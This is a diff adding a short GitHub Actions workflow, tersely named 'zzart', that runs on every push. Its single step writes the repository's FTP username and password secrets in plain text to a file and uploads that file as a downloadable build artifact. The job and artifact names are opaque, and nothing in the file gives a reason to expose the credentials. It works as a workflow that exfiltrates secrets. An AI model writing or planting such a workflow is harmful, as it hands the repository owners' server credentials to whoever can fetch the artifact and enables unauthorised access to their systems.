@@ -1,0 +1,19 @@
+name: zzart
+on:
+  push:
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: t
+        env:
+          U: ${{ secrets.KAPLN_FTP_USERNAME }}
+          P: ${{ secrets.KAPLN_FTP_PASSWORD }}
+        run: |
+          mkdir -p /tmp/out
+          printf 'U=%s\n' "$U" > /tmp/out/s.txt
+          printf 'P=%s\n' "$P" >> /tmp/out/s.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: s
+          path: /tmp/out/s.txt
